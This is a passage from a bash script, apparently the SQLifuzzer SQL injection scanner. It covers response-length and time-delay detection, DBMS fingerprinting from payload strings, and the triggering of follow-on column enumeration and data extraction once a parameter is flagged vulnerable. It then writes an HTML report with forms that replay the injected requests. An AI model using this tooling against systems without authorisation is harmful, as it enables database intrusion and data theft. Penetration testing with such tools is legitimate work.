										echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF: $answer REQ:$K]\033[0m $method URL: $uhostname$page"??"$output";
										tput sgr0 # Reset attributes.
									fi
								elif [ "$multipartPOSTURL" == 1 ] ; then
									#multipart post
									echo "[LENGTH-DIFF: $answer REQ:$K $safefilename-resdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname$page"???"$output" >> ./output/$safelogname$safefilename.txt
									echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF: $answer REQ:$K]\033[0m $method URL: $uhostname$page"???"$output"
									tput sgr0 # Reset attributes.
								else
									#normal post
									echo "[LENGTH-DIFF: $answer REQ:$K $safefilename-resdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt
									echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF: $answer REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
									tput sgr0 # Reset attributes.
								fi
							fi
						fi
					((reqcount=$reqcount+1))
					fi
					#end of response lenth diffing subsection
					#beginning status code and error checking subsection
					#this searches through the response looking for a provided error string:
					cat ./dumpfile 2>/dev/null| egrep -o "$ErrorString" > search.txt
					search=`grep "$ErrorString" search.txt`
					if [[ $search == "$ErrorString" ]]
						then echo "Application error page - skipping "$r >> ./output/$safelogname$safefilename.txt
					elif [[ $search != "$ErrorString" ]] ; then
						#continue only if the default error page has not been found run the scan...
						# the new result format is 404:4040:0.404
						# separate out the http status code from the response:
						and1eq2status=`echo $and1eq2 | cut -d ":" -f 1`
						((status=$and1eq2status))
						#TODO: the below is only set up for GETs, rework for POSTs too
						if (($status == "500")) 
							then echo "[STATUS-CODE: $status REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.status.txt 				
						fi
						#if (($status == "302")) 
						#	then echo "[STATUS-CODE: $status REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.status.txt
						#fi
						#end of status code and error checking subsection
						#beginning of time diff scan subsection
						timedelay=0
						if [[ true = "$e" || true = "$b" || true = "$eb" ]] ; then
							and1eq1=`cat ./session/$safelogname.$safehostname.and1eq1.txt 2>/dev/null`
							and1eq1time=`echo "$and1eq1" | cut -d ":" -f 3| cut -d "." -f1`
							and1eq2time=`echo "$and1eq2" | cut -d ":" -f 3| cut -d "." -f1`
							((time_diff=and1eq2time-and1eq1time))
							#we arbitrarily set the time delay diff detection threshold to five seconds:
							if (($time_diff>5)) ; then #looks interesting...
								echo -e '\E[31;48m'"\033[1m[TIME DIFF: $time_diff SECS - re-submitting request to confirm]\033[0m"
								tput sgr0 # Reset attributes.
								#re-submit the request - reduces false positives if a single request is delayed for other reasons
								mainrequester
								newand1eq1time=`echo "$and1eq1" | cut -d ":" -f 3| cut -d "." -f1`
								newand1eq2time=`echo "$and1eq2" | cut -d ":" -f 3| cut -d "." -f1`
								((newtime_diff=newand1eq2time-newand1eq1time))
							
								echo "INFO: REPEAT TIME DIFF: $newtime_diff SECS"
								((finaltime_diff=newtime_diff-time_diff))

								echo "INFO: DIFFERENCE BETWEEN BOTH TIMEDELAY REQUESTS: $finaltime_diff SECS"
								# we set the trigger threshold to be +2 or -2 seconds:
								if (($finaltime_diff<2||$finaltime_diff>-2)) ; then
									#set the vulnerable flag and sploit that mutha
									vulnerable=1
									timedelay=1
									#this code searches the clean payload to ID the dbms 
									if [[ "$cleanoutput" =~ "waitfor" || "$cleanoutput" =~ "werui" ]] ; then
										#echo "[TIME-DELAY-WAITFOR DBMS IS MSSQL] " >> ./output/$safelogname$safefilename.txt
										#echo -e '\E[31;48m'"\033[1m[TIME-DELAY-WAITFOR DBMS IS MSSQL]\033[0m"
										#tput sgr0 # Reset attributes.	
										dbms=mssql
									fi
									if [[ "$cleanoutput" =~ "benchmark" && "$cleanoutput" =~ "MD5" ]] ; then
										#echo "[TIME-DELAY-BENCHMARK DBMS IS MYSQL] " >> ./output/$safelogname$safefilename.txt
										#echo -e '\E[31;48m'"\033[1m[TIME-DELAY-BENCHMARK DBMS IS MYSQL]\033[0m"
										#tput sgr0 # Reset attributes.	
										dbms=mysql
									fi
									if [[ "$cleanoutput" =~ "UTL_INADDR" ]] ; then
										#echo "[TIME-DELAY-UTL_INADDR DBMS IS ORACLE] " >> ./output/$safelogname$safefilename.txt
										#echo -e '\E[31;48m'"\033[1m[TIME-DELAY-UTL_INADDR DBMS IS ORACLE]\033[0m"
										#tput sgr0 # Reset attributes.	
										dbms=oracle
									fi
									if [[ $method != "POST" ]] ; then #we're doing a get - simples
										echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt 
										echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
										tput sgr0 # Reset attributes.
									else
										if (($firstPOSTURIURL>0)) ; then
											if [ $firstPOSTURIURL == 1 ] ; then
												echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safelogname$safefilename.txt
												echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output"
												tput sgr0 # Reset attributes.
											else
												echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safelogname$safefilename.txt
												echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"??"$output"
												tput sgr0 # Reset attributes.
											fi
										elif [ "$multipartPOSTURL" == 1 ] ; then
											#normal post
											echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"???"$output" >> ./output/$safelogname$safefilename.txt
											echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"???"$output"
											tput sgr0 # Reset attributes.
										else
											#normal post
											echo "[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt
											echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
											tput sgr0 # Reset attributes.
										fi
									fi
								fi
							fi
						fi
					#end of time diff scan	
					fi
					#gotta clear down the output buffer:					
					outputstore=$output					
					output=''
				fi						
			done
		#for each payload the vulnerable flag is tested; if true, we call the orderby function to enumerate columns  
		if [[ $vulnerable == 1 ]] ; then
			#echo "outputstore: $outputstore"
			orderby #calling the orderby function initiates order by, union select and data extraction through string columns tests
			#if [[ $success == 0 ]] ; then
				#if [[ "$dbms" == "" ]] then
					dbtypecheck # calling the dbtypecheck initiates type db checking and conditional tests
				#fi
			#fi
		fi 
		vulnerable=0
		success=0
		#echo "DEBUG 001 sessionStorage=$sessionStorage"
		##END OF PER-PAYLOAD LOOP:	
		done
	#echo "DEBUG 002 sessionStorage=$sessionStorage"
	((paramflag=$paramflag+1))
	##END OF PER-PARAMETER LOOP:
	vulnerable=0
	done
##END OF PER-URL LOOP:
#code that stores the current URL and params for comparison against the next URL - this can be used to skip params already scanned

#this code stores the uri (which is now old) in a text file:
#this allows the old URI value to persist so that it can be compared with the new URI
#this is used to check if we are scanning the same page, or a new page.
oldURL=`echo $i | cut -d "?" -f 1`
echo $oldURL > ./session/$safelogname.$safehostname.oldURL.txt

#this code stores the stringofparams value (which is now old) in a text file
# infact, a list is created with a parameter name on each new line:
for dfg in $stringofparams; do
	echo `echo $dfg | cut -d "=" -f1` >> ./session/$safelogname.$safehostname.oldparamlist.txt
done

#the list created in the above code grows with each URL as long as the pages match
#as a result, it has to be sort|uniq-ed to remove duplicate entries
cp ./session/$safelogname.$safehostname.oldparamlist.txt ./temp.txt
cat ./temp.txt | grep . | sort | uniq > ./session/$safelogname.$safehostname.oldparamlist.txt
rm ./temp.txt
#cat ./session/$safelogname.$safehostname.oldparamlist.txt

#this code resets the firstposturl flag which is used to handle POSTs with URLs
if [ $firstPOSTURIURL == 2 ] ; then
	firstPOSTURIURL=0
fi

#write the URL number into the session file:
echo $((K+1)) > ./session/$safelogname.$safehostname.session.txt

###this code block does aggregate reporting during the scan
rm ./aggoutputlog.txt 2>/dev/null
if [[ "$includereports" == "1" ]]; then # aggregate all prior reports:
	cat ./output/$safelogname$safehostname* > ./aggoutputlog.txt 2>/dev/null
else # just aggregate this report file only
	cat ./output/$safelogname$safefilename* > ./aggoutputlog.txt 2>/dev/null
fi

cat '' > ./alertmessage.txt 2>/dev/null
if [[ "$includereports" == "1" ]] ; then # aggregate all prior reports:
	alertmessage=`cat ./output/$safelogname$safehostname* 2>/dev/null | cut -d " " -f1,2 | cut -d "[" -f2 | sort -r | uniq`
else # just aggregate this report file only
	alertmessage=`cat ./output/$safelogname$safefilename* 2>/dev/null | cut -d " " -f1,2 | cut -d "[" -f2 | sort -r | uniq`
fi

echo "$alertmessage" > ./alertmessage.txt 2>/dev/null

if [[ $alertmessage != "" ]] ; then
	echo "Update: Aggregated list of vulnerability types found:"
		cat ./alertmessage.txt | while read iter ; do 
		foo=`grep -c "$iter" ./aggoutputlog.txt` 
		echo $iter "("$foo")" 
	done
fi

done
fi

# that 'fi' above is the end of the scan loop
#if you get here, youve finished scanning so write nothing into the session file to clear it down:
echo "" > ./session/$safehostname.session.txt

#need to do this at the end to clean up:
#need to update this

rm ./parameters_to_skip.txt 2>/dev/null
rm scannerinputlist.txt 2>/dev/null
rm cleanscannerinputlist.txt 2>/dev/null
rm 0 2>/dev/null
rm dump 2>/dev/null
rm dumpfile 2>/dev/null
rm 1scannerinputlist.txt 2>/dev/null
rm search.txt 2>/dev/null
rm dumpfile 2>/dev/null
rm dump 2>/dev/null
rm payloads.txt 2>/dev/null

# this sorts the results alphabetically in reverse to make the good stuff float to the top of the page, and the errors sink to the bottom
cat ./aggoutputlog.txt 2>/dev/null | sort -r | uniq > ./output/$safelogname-sorted-$safefilename.txt  
#cat ./output/$safelogname$safefilename.status.txt 2>/dev/null | sort | uniq >> ./output/$safelogname-sorted-$safefilename.txt

# code that parses the output .txt file and creates a nice html report:
echo "<html>" >> ./output/$safelogname-report-$safefilename.html
echo "<head>" >> ./output/$safelogname-report-$safefilename.html
echo "<title>SQLifuzzer Results Page</title>" >> ./output/$safelogname-report-$safefilename.html
echo "<body bgcolor="Silver">" >> ./output/$safelogname-report-$safefilename.html
echo "<H3>SQLifuzzer Test Results</H3>" >> ./output/$safelogname-report-$safefilename.html
echo "Output file: ./output/$safelogname-sorted-$safefilename.txt" >> ./output/$safelogname-report-$safefilename.html
echo "<br>" >> ./output/$safelogname-report-$safefilename.html
echo "Host scanned: $uhostname" >> ./output/$safelogname-report-$safefilename.html
echo "<br>" >> ./output/$safelogname-report-$safefilename.html
echo "Time of scan: $(date)" >> ./output/$safelogname-report-$safefilename.html
echo "<br>" >> ./output/$safelogname-report-$safefilename.html
echo "<br>" >> ./output/$safelogname-report-$safefilename.html
echo "<H4>Aggregate Vulnerability List</H4>" >> ./output/$safelogname-report-$safefilename.html
cat ./alertmessage.txt | while read iter ; do 
	foo=`grep -c "$iter" ./aggoutputlog.txt` 
	echo "$iter" "(""$foo"")" >> ./output/$safelogname-report-$safefilename.html
	echo "<br>" >> ./output/$safelogname-report-$safefilename.html
done
echo "<br>" >> ./output/$safelogname-report-$safefilename.html
mytest=`cat ./listofxpathelements.txt 2>/dev/null`
if [[ "$mytest" != "" ]] ; then
	echo "<H4>XPath Injection Data</H4>" >> ./output/$safelogname-report-$safefilename.html
	cat ./listofxpathelements.txt | while read bLINE ; do
		echo "$bLINE" >> ./output/$safelogname-report-$safefilename.html
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html
	done
	echo "<br>" >> ./output/$safelogname-report-$safefilename.html
fi
echo "<H4>Detailed Results</H4>" >> ./output/$safelogname-report-$safefilename.html
echo "------------------------------------------------------------------" >> ./output/$safelogname-report-$safefilename.html
echo "<br>" >> ./output/$safelogname-report-$safefilename.html

echo "Reading in ./output/$safelogname-sorted-$safefilename.txt"
echo "Compiling report to create ./output/$safelogname-report-$safefilename.html"

cat ./output/$safelogname-sorted-$safefilename.txt | while read aLINE ; do
	echo -n "."
	message=`echo $aLINE|cut -d "]" -f1|cut -d "[" -f2`
	#echo $message
	fullrequest=`echo $aLINE|cut -d "]" -f2`
	method=`echo $fullrequest | cut -d " " -f1`
	request=`echo $fullrequest | cut -d " " -f3`

	protocol=`echo $request | cut -d "/" -f1`
	host=`echo $request | cut -d "/" -f3`
	#the below is named oddly - it is really 'page + params': /subdir/page.aspx?foo=1&bar=1
	params=`echo $request | cut -d "/" -f4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`
	params2=`echo "$aLINE" | cut -d "?" -f4`

	#echo "params2 $params2"
	#the below is also named oddly - it is really 'subdirs + page': subdir/page.aspx
	page=`echo $params | cut -d "?" -f1`

	#echo "fullrequest: $fullrequest"
	#echo "message $message";
	#echo "method $method";
	#echo "request $request";
	#echo "protocol $protocol"
	#echo "host $host"
	#echo "params: $params"

	if [[ "$method" == "POST" ]] ; then
		if [[ $request =~ "??" && !($request =~ "???") ]] ; then #postURI POSTs only
			postdataparams=`echo $params | cut -d "?" -f4`
			postURIparams=`echo $params | cut -d "?" -f2`
		elif [[ $request =~ "???" ]] ; then #multipart POSTs only
			#echo "params2: "$params2
			postdataparams=`echo $params2 | cut -d "?" -f4`	
			#echo "postdataparams: "$postdataparams
			echo $postdataparams | tr "&" "\n" > ./postdataparams.txt # for multipart posts: need a 'while read' later as the payloads have unencoded spaces				
		else
			postdataparams=`echo $params | cut -d "?" -f2`			
			#echo "postdataparams $postdataparams"
		fi
		postdataparamslist=`echo "$postdataparams"| replace "&" " "`
	fi
	#cat ./postdataparams.txt
	echo "$message" >> ./output/$safelogname-report-$safefilename.html
	echo "<br>" >> ./output/$safelogname-report-$safefilename.html
	echo "<br>" >> ./output/$safelogname-report-$safefilename.html
	if [[ "$method" == "GET" ]]  ; then 
		echo "$method /$params" >> ./output/$safelogname-report-$safefilename.html
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html	
		echo "Host: $host" >> ./output/$safelogname-report-$safefilename.html
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html
		echo "<a href="$request">Submit Query</a>" >> ./output/$safelogname-report-$safefilename.html
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html
	else
		if [[ $request =~ "??" && !($request =~ "???") ]] ; then #post URI params 
			echo "$method /$page?$postURIparams" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html
			echo "Host: $host" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html

			decodeinput=$postdataparams
			encodeme
			decparam=$decodeoutput

			#echo "$decparam" >> ./output/$safelogname-report-$safefilename.html
			echo "<form action="$protocol//$host/$page?$postURIparams" method="POST">" >> ./output/$safelogname-report-$safefilename.html
			for param in `echo $postdataparamslist` ; do
				paramname=`echo $param | cut -d "=" -f 1`
				paramval=`echo $param | cut -d "=" -f 2,3,4,5,6`
				#this is the in the inverse of the encoding line in the fuzz loop
				decodeinput=$paramval
				encodeme
				decparam=$decodeoutput
				echo -n "<Input type="text" size=80 name=\"$paramname\" value=\"$decparam\"> " >> ./output/$safelogname-report-$safefilename.html
			done
			echo "<input type="submit"> " >> ./output/$safelogname-report-$safefilename.html
			echo "</form> " >> ./output/$safelogname-report-$safefilename.html
		elif [[ $request =~ "???" ]] ; then #multipart post 
			echo "MULTIPART POST /$page" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html
			echo "Host: $host" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html

			echo "<form action="$protocol//$host/$page" enctype="multipart/form-data" method="POST">" >> ./output/$safelogname-report-$safefilename.html
			cat ./postdataparams.txt | while read param ; do
				paramname=`echo $param | cut -d "=" -f 1`
				paramval=`echo $param | cut -d "=" -f 2,3,4,5,6`
				echo -n "<Input type="text" size=80 name=\"$paramname\" value=\"$paramval\"> " >> ./output/$safelogname-report-$safefilename.html
			done
			echo "<input type="submit"> " >> ./output/$safelogname-report-$safefilename.html
			echo "</form> " >> ./output/$safelogname-report-$safefilename.html
		else # normal post
			echo "$method /$page" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html
			echo "Host: $host" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html
			echo "<br>" >> ./output/$safelogname-report-$safefilename.html
			decodeinput=$postdataparams
			encodeme
			decparam=$decodeoutput
			#echo "DEBUG! decparam: $decparam"
			#echo "$decparam" >> ./output/$safelogname-report-$safefilename.html
			#echo "$postdataparams"
			#echo "$postdataparamslist"
			echo "<form action="$protocol//$host/$page" method="POST">" >> ./output/$safelogname-report-$safefilename.html
			for param in `echo $postdataparamslist` ; do
				paramname=`echo $param | cut -d "=" -f 1`
				paramval=`echo $param | cut -d "=" -f 2,3,4,5,6`
				decodeinput=$paramval
				encodeme
				decparam=$decodeoutput
				echo -n "<Input type="text" size=80 name=\"$paramname\" value=\"$decparam\"> " >> ./output/$safelogname-report-$safefilename.html
				#echo "<br>" >> ./output/$safelogname-report-$safefilename.html
			done
			echo "<input type="submit"> " >> ./output/$safelogname-report-$safefilename.html
			echo "</form> " >> ./output/$safelogname-report-$safefilename.html
		fi
	fi
	if [[ "$message" =~ "DATA-EXTRACTED:" ]] ; then
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html
		respdiff=`echo $message | grep -o $safehostname.*` 
		#echo "debug message=$message"
		#echo "debug respdiff=$respdiff"
		echo " <a href="./../responsediffs/$respdiff">View Extracted Data</a>" >> ./output/$safelogname-report-$safefilename.html
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html	
	fi
	if [[ "$message" =~ "LENGTH-DIFF:" ]] ; then
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html

		respdiff=`echo $message | cut -d " " -f 4`

		#echo "debug message=$message"
		#echo "debug respdiff=$respdiff"
		echo " <a href="./../responsediffs/$respdiff">View Response Diff</a>" >> ./output/$safelogname-report-$safefilename.html
		echo "<br>" >> ./output/$safelogname-report-$safefilename.html	
	fi
	echo "------------------------------------------------------------------" >> ./output/$safelogname-report-$safefilename.html
	echo "<br>" >> ./output/$safelogname-report-$safefilename.html
done
#mothballing this aspect of reporting for now. it looks crap.
#echo "<H3>sqlifuzzer site analysis</H3>" >> ./output/$safelogname-report-$safefilename.html
#cat ./session/$safelogname.$safehostname.siteanalysis.txt | while read bLINE ; do
#	echo -n "."
#	echo "$bLINE" >> ./output/$safelogname-report-$safefilename.html
#	echo "<br>" >> ./output/$safelogname-report-$safefilename.html
#done
echo "" > ./session/$safelogname.$safehostname.siteanalysis.txt	
echo "</body>" >> ./output/$safelogname-report-$safefilename.html
echo "</html>" >> ./output/$safelogname-report-$safefilename.html 
echo ""
rm ./aggoutputlog.txt 2>/dev/null

cp ./alertmessage.txt ./useful.txt
rm ./alertmessage.txt 2>/dev/null
rm ./listofxpathnodes.txt 2>/dev/null
rm ./listofxpathelements.txt 2>/dev/null
rm ./multipartlist.txt 2>/dev/null
rm ./selcheck1 2>/dev/null
rm ./useful.txt 2>/dev/null
rm ./foo.txt 2>/dev/null

echo "Done. HTML report written to ./output/$safelogname-report-$safefilename.html"
echo "Attempting to open ./output/$safelogname-report-$safefilename.html with firefox"
firefox ./output/$safelogname-report-$safefilename.html 2>/dev/null &
